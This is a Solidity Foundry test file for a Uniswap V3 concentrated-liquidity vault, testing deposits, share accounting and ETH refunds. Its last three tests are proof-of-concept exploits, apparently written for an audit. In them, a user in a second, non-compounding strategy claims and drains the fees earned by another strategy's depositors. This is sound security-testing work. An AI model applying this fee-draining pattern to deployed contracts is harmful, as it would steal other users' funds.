// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.15;

import { Vm } from "forge-std/Vm.sol";
import { Test } from "forge-std/Test.sol";
import { CLTBase } from "../src/CLTBase.sol";

import { Fixtures } from "./utils/Fixtures.sol";
import { Utilities } from "./utils/Utilities.sol";

import { ICLTBase } from "../src/interfaces/ICLTBase.sol";
import { Constants } from "../src/libraries/Constants.sol";
import { PoolActions } from "../src/libraries/PoolActions.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { FullMath } from "@uniswap/v3-core/contracts/libraries/FullMath.sol";
import { TickMath } from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import { ISwapRouter } from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import { IUniswapV3Pool } from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import "forge-std/console.sol";

contract CLTDepositTest is Test, Fixtures {
    Utilities utils;
    ICLTBase.StrategyKey key;

    event Deposit(
        uint256 indexed tokenId, address indexed recipient, uint256 liquidity, uint256 amount0, uint256 amount1
    );

    function setUp() public {
        deployFreshState();
        utils = new Utilities();

        key = ICLTBase.StrategyKey({ pool: pool, tickLower: -100, tickUpper: 100 });
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);

        base.createStrategy(key, actions, 0, 0, true, false);

        token0.approve(address(base), UINT256_MAX);
        token1.approve(address(base), UINT256_MAX);
    }

    function test_deposit_succeedsWithCorrectShare() public {
        bytes32 strategyID = getStrategyID(address(this), 1);
        uint256 depositAmount = 1 ether;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        vm.expectEmit(true, true, false, true);
        emit Deposit(1, msg.sender, depositAmount, depositAmount, depositAmount);

        base.deposit(params);

        (, uint256 liquidityShare,,,,) = base.positions(1);
        (,,,,,,,, ICLTBase.Account memory account) = base.strategies(strategyID);

        assertEq(account.balance0, 1);
        assertEq(account.balance1, 1);
        assertEq(account.totalShares, depositAmount);
        assertEq(base.balanceOf(msg.sender), 1);
        assertEq(liquidityShare, depositAmount);
        assertEq(account.uniswapLiquidity, 200_510_416_479_002_803_087);
    }

    function test_deposit_revertsIfZeroAmount() public {
        bytes32 strategyID = getStrategyID(address(this), 1);
        uint256 depositAmount = 0;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        vm.expectRevert(ICLTBase.InvalidShare.selector);
        base.deposit(params);
    }

    function test_deposit_revertsIfMinShare() public {
        bytes32 strategyID = getStrategyID(address(this), 1);
        uint256 depositAmount = Constants.MIN_INITIAL_SHARES - 1;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        vm.expectRevert(ICLTBase.InvalidShare.selector);
        base.deposit(params);
    }

    function test_deposit_succeedsWithNativeToken() public {
        pool = IUniswapV3Pool(factory.createPool(address(weth), address(token1), 500));
        pool.initialize(TickMath.getSqrtRatioAtTick(0));

        key = ICLTBase.StrategyKey({ pool: pool, tickLower: -100, tickUpper: 100 });
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);

        base.createStrategy(key, actions, 0, 0, true, false);

        bytes32 strategyID = getStrategyID(address(this), 2);
        uint256 depositAmount = 3 ether;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        base.deposit{ value: depositAmount }(params);

        (, uint256 liquidityShare,,,,) = base.positions(1);
        (,,,,,,,, ICLTBase.Account memory account) = base.strategies(strategyID);

        assertEq(account.totalShares, depositAmount);
        assertEq(liquidityShare, depositAmount);
        assertEq(account.uniswapLiquidity, 601_531_249_437_008_409_662);
    }

    function test_deposit_revertsWithInSufficientFunds() public {
        bytes32 strategyID = getStrategyID(address(this), 1);
        uint256 depositAmount = 1 ether;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        vm.prank(msg.sender);
        vm.expectRevert();
        base.deposit(params);
    }

    function test_deposit_multipleUsers() public {
        initPoolAndAddLiquidity();
        initRouter();

        address payable[] memory users = utils.createUsers(2);
        uint256 depositAmount = 5 ether;

        token0.mint(users[0], depositAmount);
        token0.mint(users[1], depositAmount);

        token1.mint(users[0], depositAmount);
        token1.mint(users[1], depositAmount);

        vm.startPrank(users[0]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        vm.startPrank(users[1]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        bytes32 strategyID = getStrategyID(address(this), 1);

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        base.deposit(params);

        vm.prank(users[0]);
        base.deposit(params);

        (, uint256 liquidityShareUser1,,,,) = base.positions(2);
        (,,,,,,,, ICLTBase.Account memory account) = base.strategies(strategyID);

        assertEq(account.totalShares, (depositAmount * 2) + 1);
        assertEq(liquidityShareUser1, depositAmount + 1);

        // try swapping here to check contract balances
        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token1),
                tokenOut: address(token0),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        vm.prank(users[1]);
        base.deposit(params);

        (,,,,,,,, account) = base.strategies(strategyID);

        (, uint256 liquidityShareUser2,,,,) = base.positions(3);

        assertEq(account.balance0, 360_616_736_599_642);
        assertEq(account.totalShares, (depositAmount * 2) + liquidityShareUser2 + 1);
    }

    function test_deposit_multipleUsersNonCompound() public {
        initPoolAndAddLiquidity();
        initRouter();

        address payable[] memory users = utils.createUsers(2);
        uint256 depositAmount = 5 ether;

        token0.mint(users[0], depositAmount);
        token0.mint(users[1], depositAmount);

        token1.mint(users[0], depositAmount);
        token1.mint(users[1], depositAmount);

        vm.startPrank(users[0]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        vm.startPrank(users[1]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
        base.createStrategy(key, actions, 0, 0, false, false);

        bytes32 strategyID = getStrategyID(address(this), 2);

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        base.deposit(params);
        (, uint256 liquidityShareUser1,,,,) = base.positions(1);

        vm.prank(users[0]);
        base.deposit(params);

        (, uint256 liquidityShareUser2,,,,) = base.positions(2);
        (,,,,,,,, ICLTBase.Account memory account) = base.strategies(strategyID);

        assertEq(account.totalShares, 2_005_104_164_790_028_033_079);
        assertEq(liquidityShareUser2, 1_002_552_082_395_014_016_640);

        assertEq(account.balance0, 0);
        assertEq(account.balance1, 0);

        // try swapping here to check contract balances
        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token1),
                tokenOut: address(token0),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        vm.prank(users[1]);
        base.deposit(params);

        vm.prank(msg.sender);
        (uint256 amount0, uint256 amount1) = base.withdraw(
            ICLTBase.WithdrawParams({
                tokenId: 1,
                liquidity: liquidityShareUser1,
                recipient: address(this),
                refundAsETH: true
            })
        );

        console.log("withdraw user1 amounts -> ", amount0, amount1);

        vm.prank(msg.sender);
        (amount0, amount1) = base.withdraw(
            ICLTBase.WithdrawParams({
                tokenId: 2,
                liquidity: liquidityShareUser2,
                recipient: users[0],
                refundAsETH: true
            })
        );

        console.log("withdraw user2 amounts -> ", amount0, amount1);

        (, uint256 liquidityShareUser3,,,,) = base.positions(3);

        // vm.prank(msg.sender);
        // (amount0, amount1) = base.withdraw(
        //     ICLTBase.WithdrawParams({
        //         tokenId: 3,
        //         liquidity: liquidityShareUser3,
        //         recipient: users[1],
        //         refundAsETH: true
        //     })
        // );

        // console.log("withdraw user3 amounts -> ", amount0, amount1);

        // (,,,,,,,, account) = base.strategies(strategyID);

        // (, uint256 liquidityShareUser2,,,,) = base.positions(3);

        // assertEq(account.balance0, 360_616_736_599_641);
        // assertEq(account.totalShares, (depositAmount * 2) + liquidityShareUser2 + 1);
    }

    function test_deposit_succeedsOutOfRangeDeposit() public {
        initPoolAndAddLiquidity();
        initRouter();

        bytes32 strategyID = getStrategyID(address(this), 1);
        uint256 depositAmount = 1 ether;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        base.deposit(params);

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        base.deposit(params);

        (, uint256 liquidityShareUser2,,,,) = base.positions(2);

        // assertEq(liquidityShareUser2, 498_625_034_701_312_208);
    }

    function test_deposit_shouldReturnExtraETH() public {
        pool = IUniswapV3Pool(factory.createPool(address(weth), address(token1), 500));
        pool.initialize(TickMath.getSqrtRatioAtTick(0));

        key = ICLTBase.StrategyKey({ pool: pool, tickLower: -100, tickUpper: 100 });
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);

        base.createStrategy(key, actions, 0, 0, true, false);

        bytes32 strategyID = getStrategyID(address(this), 2);
        uint256 depositAmount = 3 ether;

        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
            strategyId: strategyID,
            amount0Desired: depositAmount,
            amount1Desired: depositAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: msg.sender
        });

        uint256 balanceBefore = address(this).balance;
        base.deposit{ value: depositAmount + 2 ether }(params);

        assertEq(address(this).balance, balanceBefore - depositAmount);
    }

    function test_poc_scenerio1() public {
        initPoolAndAddLiquidity();
        initRouter();

        address payable[] memory users = utils.createUsers(2);
        uint256 depositAmount = 5 ether;

        token0.mint(users[0], depositAmount);
        token0.mint(users[1], depositAmount);

        token1.mint(users[0], depositAmount);
        token1.mint(users[1], depositAmount);

        vm.startPrank(users[0]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        vm.startPrank(users[1]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        bytes32 strategyID1 = getStrategyID(address(this), 1);

        vm.prank(users[0]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID1,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[0]
            })
        );

        // create 2nd strategy with same compounding tunrned off
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
        base.createStrategy(key, actions, 0, 0, false, false);

        bytes32 strategyID2 = getStrategyID(address(this), 2);

        vm.prank(users[1]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID2,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[1]
            })
        );

        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
        (, uint256 liquidityShareUser2,,,,) = base.positions(2);

        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        base.updateFees(key);

        (,,, uint256 fee0, uint256 fee1) =
            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));

        console.log("total fees of both strategies -> ", fee0, fee1);

        vm.prank(users[1]);
        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));

        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);

        console.log(
            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
        );
    }

    function test_poc_scenerio2() public {
        initPoolAndAddLiquidity();
        initRouter();

        address payable[] memory users = utils.createUsers(2);
        uint256 depositAmount = 5 ether;

        token0.mint(users[0], depositAmount);
        token0.mint(users[1], depositAmount);

        token1.mint(users[0], depositAmount);
        token1.mint(users[1], depositAmount);

        vm.startPrank(users[0]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        vm.startPrank(users[1]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        bytes32 strategyID1 = getStrategyID(address(this), 1);

        vm.prank(users[0]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID1,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[0]
            })
        );

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        base.updateFees(key);

        (,,, uint256 fee0, uint256 fee1) =
            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));

        console.log("total fees of first strategy -> ", fee0, fee1);

        // create 2nd strategy with compounding turned off
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
        base.createStrategy(key, actions, 0, 0, false, false);

        bytes32 strategyID2 = getStrategyID(address(this), 2);

        vm.prank(users[1]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID2,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[1]
            })
        );

        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
        (, uint256 liquidityShareUser2,,,,) = base.positions(2);

        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);

        vm.prank(users[1]);
        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));

        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);

        console.log(
            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
        );
    }

    function test_poc_scenerio3() public {
        initPoolAndAddLiquidity();
        initRouter();

        address payable[] memory users = utils.createUsers(2);
        uint256 depositAmount = 5 ether;

        token0.mint(users[0], depositAmount);
        token0.mint(users[1], depositAmount);

        token1.mint(users[0], depositAmount);
        token1.mint(users[1], depositAmount);

        vm.startPrank(users[0]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        vm.startPrank(users[1]);
        token0.approve(address(base), depositAmount);
        token1.approve(address(base), depositAmount);
        vm.stopPrank();

        bytes32 strategyID1 = getStrategyID(address(this), 1);

        vm.prank(users[0]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID1,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[0]
            })
        );

        // create 2nd strategy with compounding turned off
        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
        base.createStrategy(key, actions, 0, 0, false, false);

        bytes32 strategyID2 = getStrategyID(address(this), 2);

        vm.prank(users[1]);
        base.deposit(
            ICLTBase.DepositParams({
                strategyId: strategyID2,
                amount0Desired: depositAmount,
                amount1Desired: depositAmount,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users[1]
            })
        );

        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
        (, uint256 liquidityShareUser2,,,,) = base.positions(2);

        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token0),
                tokenOut: address(token1),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 1 days,
                amountIn: 1e30,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        base.updateFees(key);

        (,,, uint256 fee0, uint256 fee1) =
            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));

        console.log("total fees of both strategies -> ", fee0, fee1);

        vm.prank(users[1]);
        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));

        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);

        console.log(
            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
        );
    }

    receive() external payable { }
}
